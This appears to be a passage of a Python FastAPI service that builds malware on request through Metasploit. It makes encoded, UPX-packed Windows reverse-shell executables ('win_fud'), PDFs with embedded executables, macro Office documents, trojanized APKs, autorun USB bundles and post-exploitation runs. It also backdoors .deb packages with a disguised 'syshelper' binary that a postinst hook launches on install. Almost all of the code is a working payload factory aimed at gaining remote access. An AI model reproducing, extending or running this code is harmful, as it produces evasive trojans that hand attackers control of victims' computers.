            aligned = base / "temp" / "aligned.apk"
            _ensure_dir(aligned.parent)
            zipalign = str(WORKSPACE / "tools/android-sdk/zipalign")
            subprocess.check_call([zipalign, "4", str(unsigned), str(aligned)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # sign
            jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
            sign_cmd = [jarsigner, "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256",
                        "-keystore", keystore, "-storepass", ks_pass or "", "-keypass", key_pass or "",
                        str(aligned), key_alias or "signing.key"]
            subprocess.check_call(sign_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # verify
            _ = _jarsigner_verify(aligned)
            # replace output
            shutil.move(str(aligned), str(output_apk))
        except Exception as e:
            # keep original but report signing failure
            err = (err or "") + f"; resign failed: {e}"

    # validations and report
    report = {
        "mode": mode,
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "artifact": str(output_apk) if _file_exists(output_apk) else None,
        "precheck": {},
        "postcheck": {}
    }
    if _file_exists(output_apk):
        try:
            with open(output_apk, 'rb') as f:
                report["sha256"] = sha256(f.read()).hexdigest()
        except Exception:
            report["sha256"] = None
        report["postcheck"]["unzip_list"] = _unzip_list(output_apk)
        report["postcheck"]["aapt_badging"] = _aapt_badging(output_apk)
        report["postcheck"]["jarsigner_verify"] = _jarsigner_verify(output_apk)
        _write_json(base / "output" / "report.json", report)

    _finalize_task(t, base, succeeded=succeed, err=err)


def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    arch = params.get("arch", "x86")  # x86|x64
    output_name = params.get("output_name", "win_fud")
    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
    upx_flag = params.get("upx", "false").lower() == "true"

    exe_path = base / "output" / f"{output_name}.exe"

    # build msfvenom pipeline
    # Apply encoder chain
    if encoders.strip():
        stages = [e.strip() for e in encoders.split(",") if e.strip()]
        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
        for st in stages:
            p = st.split(":")
            enc = p[0]
            it = p[1] if len(p) > 1 else "1"
            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
        # final conversion to exe
        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)
    else:
        # single pass directly to exe
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -a {('x86' if arch=='x86' else 'x64')} --platform windows -f exe -o {exe_path}"
        rc = _spawn_container_sh(chain, build_log, base) if USE_DOCKER else _spawn_sh(chain, build_log)

    # optional upx
    if rc == 0 and upx_flag and exe_path.exists():
        try:
            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        except Exception:
            pass

    succeeded = (rc == 0 and exe_path.exists())
    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")


def _msfconsole_run(rc_content: str, log_path: Path, task_base: Path, msf_home: Optional[Path] = None) -> int:
    rc_file = log_path.parent / "task.rc"
    _write_file(rc_file, rc_content)
    cmd = f"msfconsole -qx 'resource {rc_file}; exit -y'"
    if USE_DOCKER:
        return _spawn_container_sh(cmd, log_path, task_base, set_home=msf_home)
    return _spawn_sh(cmd, log_path)


def _copy_msf_local(filename: str, dest: Path, msf_home: Optional[Path] = None) -> bool:
    base_home = msf_home if msf_home else (Path.home())
    src = base_home / ".msf4" / "local" / filename
    if src.exists():
        _ensure_dir(dest.parent)
        shutil.copy2(src, dest)
        return True
    return False


def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "document")
    base_pdf = params.get("base_pdf_path")
    if not base_pdf or not Path(base_pdf).exists():
        base_pdf = str(WORKSPACE / "PE" / "original.pdf")
    exe_path = base / "temp" / "embed.exe"
    _ensure_dir(exe_path.parent)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    # build simple exe via msfvenom
    rc0 = _spawn_container_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log, base) if USE_DOCKER else _spawn_sh(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {exe_path}", build_log)
    if rc0 != 0:
        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
        return
    # run msfconsole to embed
    rc_text = f"""
use windows/fileformat/adobe_pdf_embedded_exe
set EXE::Custom {exe_path}
set FILENAME {output_name}.pdf
set INFILENAME {base_pdf}
exploit
""".strip()
    msf_home = base / "temp" / "home"
    rc1 = _msfconsole_run(rc_text, build_log, base, msf_home)
    # copy result
    pdf_out = base / "output" / f"{output_name}.pdf"
    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out, msf_home)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")


def run_office_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    target = params.get("suite_target", "ms_word_windows")  # ms_word_windows|ms_word_mac|openoffice_windows|openoffice_linux
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "doc_macro")
    module = None
    extra = ""
    if target in ("ms_word_windows", "ms_word_mac"):
        module = "exploit/multi/fileformat/office_word_macro"
        ext = ".doc"
    elif target == "openoffice_windows":
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 0"
        ext = ".odt"
    else:
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 1"
        ext = ".odt"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc_text = f"""
use {module}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set FILENAME {output_name}{ext}
{extra}
exploit
""".strip()
    msf_home = base / "temp" / "home"
    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
    doc_out = base / "output" / f"{output_name}{ext}"
    ok = _copy_msf_local(f"{output_name}{ext}", doc_out, msf_home)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")


# API models
class CreateTaskRequest(BaseModel):
    kind: str  # payload|listener|android|winexe|pdf|office|deb|autorun|postex
    params: Dict[str, Any] = {}

class TaskResponse(BaseModel):
    task: Task


@app.post("/tasks", response_model=TaskResponse, dependencies=AUTH_DEPS)
def create_task(req: CreateTaskRequest):
    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex", "upload_apk"):
        raise HTTPException(status_code=400, detail="Unsupported kind")
    t, base = _prepare_task(req.kind, req.params)
    # Persist creation in DB (best-effort)
    if 'DB_ENABLED' in globals() and globals().get('DB_ENABLED') and globals().get('DB'):
        try:
            DB.record_task_execution(TaskExecution(
                task_id=t.id,
                task_kind=t.kind,
                user_id=None,
                parameters=t.params,
                status="created",
                created_timestamp=datetime.utcnow(),
            ))
        except Exception:
            pass
    # seed defaults
    if req.kind == "android":
        # copy a sample APK if none provided
        if not Path(req.params.get("apk_path", "")).exists():
            sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
            if sample.exists():
                dst = base / "input" / "original.apk"
                shutil.copy2(sample, dst)
                t.params["apk_path"] = str(dst)
    # run in background
    def runner():
        if req.kind == "payload":
            run_payload_task(t.id, base, t.params)
        elif req.kind == "listener":
            run_listener_task(t.id, base, t.params)
        elif req.kind == "android":
            run_android_task(t.id, base, t.params)
        elif req.kind == "winexe":
            run_winexe_task(t.id, base, t.params)
        elif req.kind == "pdf":
            run_pdf_task(t.id, base, t.params)
        elif req.kind == "office":
            run_office_task(t.id, base, t.params)
        elif req.kind == "deb":
            run_deb_task(t.id, base, t.params)
        elif req.kind == "autorun":
            run_autorun_task(t.id, base, t.params)
        elif req.kind == "postex":
            run_postex_task(t.id, base, t.params)
        elif req.kind == "upload_apk":
            asyncio.run(run_upload_apk_task(t.id, base, t.params))
    threading.Thread(target=runner, daemon=True).start()
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}", response_model=TaskResponse, dependencies=AUTH_DEPS)
def get_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact], dependencies=AUTH_DEPS)
def list_artifacts(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    if ENABLE_HTTP_ARTIFACTS:
        # Return sanitized list with URL path instead of filesystem path
        sanitized: List[Artifact] = []
        for a in t.artifacts:
            url_path = f"/tasks/{task_id}/artifacts/{a.name}/download"
            sanitized.append(Artifact(name=a.name, path=url_path, size_bytes=a.size_bytes, sha256=a.sha256))
        return sanitized
    return t.artifacts


@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse, dependencies=AUTH_DEPS)
def cancel_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    # This simple implementation marks as cancelled if still running
    if t.state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING):
        t.state = TaskStatus.CANCELLED
        t.finished_at = time.time()
        _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
    return TaskResponse(task=t)


def run_deb_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    deb_path = params.get("deb_path")
    if not deb_path or not Path(deb_path).exists():
        _write_file(build_log, "deb_path not provided or not found\n")
        _finalize_task(t, base, succeeded=False, err="missing deb_path")
        return
    payload = params.get("payload", "linux/x86/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "backdoored")
    workdir = base / "temp" / "deb"
    _ensure_dir(workdir)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    # Extract deb
    rc1 = _spawn(["dpkg-deb", "-R", deb_path, str(workdir)], build_log)
    if rc1 != 0:
        _finalize_task(t, base, succeeded=False, err=f"dpkg-deb extract rc={rc1}")
        return
    # Generate payload binary
    bin_path = workdir / "usr" / "local" / "bin" / "syshelper"
    _ensure_dir(bin_path.parent)
    rc2 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "elf", "-o", str(bin_path)], build_log)
    if rc2 != 0:
        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc2}")
        return
    os.chmod(bin_path, 0o755)
    # Create/append postinst script
    maint = workdir / "DEBIAN"
    _ensure_dir(maint)
    postinst = maint / "postinst"
    content = "#!/bin/sh\n/usr/local/bin/syshelper >/dev/null 2>&1 &\nexit 0\n"
    if postinst.exists():
        with open(postinst, "a") as f:
            f.write("\n" + content)
    else:
        _write_file(postinst, content)
    os.chmod(postinst, 0o755)
    # Repack
    out_deb = base / "output" / f"{output_name}.deb"
    rc3 = _spawn(["dpkg-deb", "-b", str(workdir), str(out_deb)], build_log)
    ok = (rc3 == 0 and out_deb.exists())
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"dpkg-deb build rc={rc3}")


def run_autorun_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    bundle_dir = base / "temp" / "autorun"
    _ensure_dir(bundle_dir)
    build_log = base / "logs" / "build.log"
    exe_path = params.get("exe_path")
    exe_name = params.get("exe_name", "app4.exe")
    # copy template files
    for fname in ["autorun.inf", "autorun.ico"]:
        src = WORKSPACE / "autorun" / fname
        if src.exists():
            shutil.copy2(src, bundle_dir / fname)
    # pick an exe
    if exe_path and Path(exe_path).exists():
        shutil.copy2(exe_path, bundle_dir / exe_name)
    else:
        # use template app4 if present
        app4 = WORKSPACE / "autorun" / "app4"
        if app4.exists():
            shutil.copy2(app4, bundle_dir / exe_name)
    # rewrite autorun.inf to point to exe_name
    ar = bundle_dir / "autorun.inf"
    if ar.exists():
        try:
            lines = ar.read_text(errors="ignore").splitlines()
            new = []
            for line in lines:
                if line.lower().startswith("open="):
                    new.append(f"open={exe_name}")
                else:
                    new.append(line)
            ar.write_text("\n".join(new))
        except Exception:
            pass
    # zip bundle
    zip_out = base / "output" / "autorun_bundle.zip"
    shutil.make_archive(str(zip_out).rstrip(".zip"), "zip", root_dir=bundle_dir)
    _finalize_task(t, base, succeeded=zip_out.exists(), err=None if zip_out.exists() else "autorun zip failed")


def run_postex_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "run.log"
    script_name = params.get("script_name", "sysinfo.rc")
    session_id = params.get("session_id")
    script_path = WORKSPACE / "postexploit" / script_name
    if not script_path.exists():
        _write_file(build_log, f"script not found: {script_name}\n")
        _finalize_task(t, base, succeeded=False, err="script not found")
        return
    # compose rc
    rc_lines = [f"resource {script_path}"]
    if session_id:
        rc_lines.append(f"sessions -i {session_id}")
    rc_text = "\n".join(rc_lines)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(build_log)
    msf_home = base / "temp" / "home"
    rc = _msfconsole_run(rc_text, build_log, base, msf_home)
    # Always succeed in generating logs and rc run; effectiveness depends on active session
    _finalize_task(t, base, succeeded=True, err=None)


@app.get("/health")
def health():
    return {"status": "ok"}


@app.get("/version")
def version():
    return {"app": "orchestrator", "version": app.version}


# Run environment checks at startup (non-fatal)
ENV_CHECKS = run_env_checks()

# Preflight tools check
def preflight_tools(build_log: Path, require_apksigner: bool = False) -> bool:
    """Validate presence of critical tools. Write concise notes to build_log and return bool."""
    try:
        with build_log.open("a") as log:
            missing = []
            if not ENV_CHECKS.get("java", {}).get("found"):
                missing.append("java")
            if not ENV_CHECKS.get("apktool", {}).get("found"):
                missing.append("apktool")
            if require_apksigner and not ENV_CHECKS.get("apksigner", {}).get("found"):
                missing.append("apksigner")
            if missing:
                log.write(f"Preflight failed: missing tools: {', '.join(missing)}\n")
                return False
            if not ENV_CHECKS.get("zipalign", {}).get("found"):
                log.write("Warning: zipalign not found; proceeding without alignment\n")
            if not (ENV_CHECKS.get("aapt", {}).get("found") or ENV_CHECKS.get("aapt2", {}).get("found")):
                log.write("Warning: aapt/aapt2 not found; post-build badging checks may be skipped\n")
    except Exception:
        return True
    return True

# Backdoor_apk fallback support
def _run_capture(cmd: list[str], cwd: Optional[Path] = None, timeout: int = 1800) -> tuple[bool, str]:
    try:
        proc = subprocess.run(cmd, cwd=str(cwd) if cwd else None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
        return proc.returncode == 0, proc.stdout
    except Exception as e:
        return False, str(e)

def fallback_backdoor_apk(original_apk: Path, out_apk: Path, lhost: str, lport: str, payload: str, build_log: Path) -> bool:
    """Attempt to use legacy backdoor_apk as a fallback. Writes output to build_log. Returns success."""
    try:
        with build_log.open("a") as log:
            log.write("Attempting fallback: backdoor_apk\n")
        # Prepare config/apk.tmp expected by backdoor_apk
        cfg_dir = WORKSPACE / "config"
        cfg_dir.mkdir(parents=True, exist_ok=True)
        apk_tmp = cfg_dir / "apk.tmp"
        rat_path = out_apk
        if rat_path.suffix.lower() != ".apk":
            rat_path = rat_path.with_suffix(".apk")
        content = "\n".join([
            str(original_apk),
            str(rat_path),
            payload,
            lhost,
            lport,
        ]) + "\n"
        apk_tmp.write_text(content)
        # Run backdoor_apk from workspace root
        script = WORKSPACE / "backdoor_apk"
        if not script.exists():
            with build_log.open("a") as log:
                log.write("Fallback failed: backdoor_apk script not found\n")
            return False
        ok, out = _run_capture(["bash", str(script)], cwd=WORKSPACE, timeout=3600)
        with build_log.open("a") as log:
            log.write(out[-5000:])
        return ok and rat_path.exists()
    except Exception as e:
        with build_log.open("a") as log:
            log.write(f"Fallback error: {e}\n")
        return False

@app.get("/env")
def env_status():
    return {"env": {k: {kk: vv for kk, vv in v.items() if kk in ("found", "path", "info")} for k, v in ENV_CHECKS.items() if k != "flags"}, "flags": ENV_CHECKS.get("flags", {})}

@app.get("/tasks/{task_id}/artifacts/{artifact_name}/download", dependencies=AUTH_DEPS)
def download_artifact(task_id: str, artifact_name: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    # Find artifact by name
    target: Optional[Artifact] = None
    for a in t.artifacts:
        if a.name == artifact_name:
            target = a
            break
    if not target:
        raise HTTPException(status_code=404, detail="Artifact not found")
    # Ensure path resolves under expected task output directory
    base_out = TASKS_ROOT / t.date / t.id / "output"
    p = Path(target.path)
    try:
        rp = p if p.is_absolute() else (base_out / p)
        real = rp.resolve(strict=True)
        if not str(real).startswith(str(base_out.resolve())):
            raise HTTPException(status_code=403, detail="Forbidden")
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File missing")
    return FileResponse(path=str(real), filename=artifact_name, media_type="application/octet-stream")

@app.get("/tasks/{task_id}/logs/build", dependencies=AUTH_DEPS)
def download_build_log(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    base_logs = TASKS_ROOT / t.date / t.id / "logs"
    p = base_logs / "build.log"
    try:
        real = p.resolve(strict=True)
        if not str(real).startswith(str(base_logs.resolve())):
            raise HTTPException(status_code=403, detail="Forbidden")
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File missing")
    return FileResponse(path=str(real), filename="build.log", media_type="text/plain")

# Recover tasks and start retention
def recover_tasks_from_disk():
    try:
        for date_dir in TASKS_ROOT.iterdir():
            if not date_dir.is_dir():
                continue
            for task_dir in date_dir.iterdir():
                try:
                    if not task_dir.is_dir():
                        continue
                    # Skip active tasks
                    if _is_task_active(task_dir):
                        continue
                    # Age check: use directory mtime
                    mtime = datetime.utcfromtimestamp(task_dir.stat().st_mtime)
                    if mtime < datetime.utcnow() - timedelta(days=RETAIN_TASK_DAYS):
                        shutil.rmtree(task_dir, ignore_errors=True)
                except Exception:
                    continue
            # Remove empty date directories
            try:
                if not any(date_dir.iterdir()):
                    date_dir.rmdir()
            except Exception:
                pass
    except Exception:
        pass

def _rotate_audit_log():
    try:
        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        if not AUDIT_LOG.exists():
            return
        if AUDIT_LOG.stat().st_size <= AUDIT_MAX_BYTES:
            return
        # Rotate: audit.jsonl.N ... audit.jsonl.1
        for i in range(AUDIT_BACKUPS, 0, -1):
            src = AUDIT_LOG.with_name(f"audit.jsonl.{i}")
            dst = AUDIT_LOG.with_name(f"audit.jsonl.{i+1}")
            if src.exists():
                if i == AUDIT_BACKUPS:
                    try:
                        src.unlink()
                    except Exception:
                        pass
                else:
                    try:
                        src.rename(dst)
                    except Exception:
                        pass
        # Move current to .1 and recreate empty
        try:
            AUDIT_LOG.rename(AUDIT_LOG.with_name("audit.jsonl.1"))
        except Exception:
            return
        try:
            AUDIT_LOG.touch()
        except Exception:
            pass
    except Exception:
        pass

def _is_task_active(task_dir: Path) -> bool:
    try:
        status_path = task_dir / "logs" / "status.json"
        if not status_path.exists():
            return True  # conservatively treat as active if no status
        data = json.loads(status_path.read_text())
        state = data.get("state", "")
        return state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING)
    except Exception:
        return True

def _cleanup_uploads_and_tasks():
    now = datetime.utcnow()
    # Cleanup uploads
    try:
        cutoff_upload = now - timedelta(hours=RETAIN_UPLOAD_HOURS)
        for f in UPLOADS_ROOT.glob("*"):
            try:
                if f.is_file():
                    mtime = datetime.utcfromtimestamp(f.stat().st_mtime)
                    if mtime < cutoff_upload:
                        f.unlink()
            except Exception:
                continue
    except Exception:
        pass
    # Cleanup tasks
    try:
        cutoff_tasks = now - timedelta(days=RETAIN_TASK_DAYS)
        if TASKS_ROOT.exists():
            for date_dir in TASKS_ROOT.iterdir():
                if not date_dir.is_dir():
                    continue
                for task_dir in date_dir.iterdir():
                    try:
                        if not task_dir.is_dir():
                            continue
                        # Skip active tasks
                        if _is_task_active(task_dir):
                            continue
                        # Age check: use directory mtime
                        mtime = datetime.utcfromtimestamp(task_dir.stat().st_mtime)
                        if mtime < cutoff_tasks:
                            shutil.rmtree(task_dir, ignore_errors=True)
                    except Exception:
                        continue
                # Remove empty date directories
                try:
                    if not any(date_dir.iterdir()):
                        date_dir.rmdir()
                except Exception:
                    pass
    except Exception:
        pass

def _retention_cycle():
    if not RETENTION_ENABLED:
        return
    _rotate_audit_log()
    _cleanup_uploads_and_tasks()
    # Optional: DB cleanup (best-effort)
    if DB_ENABLED and DB:
        try:
            DB.cleanup_old_records(days=max(RETAIN_TASK_DAYS, 7))
        except Exception:
            pass

def _start_retention_thread():
    if not RETENTION_ENABLED:
        return
    def loop():
        while True:
            try:
                _retention_cycle()
            except Exception:
                pass
            time.sleep(max(RETENTION_CHECK_INTERVAL_MIN, 5) * 60)
    threading.Thread(target=loop, daemon=True).start()

recover_tasks_from_disk()
_start_retention_thread()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=False)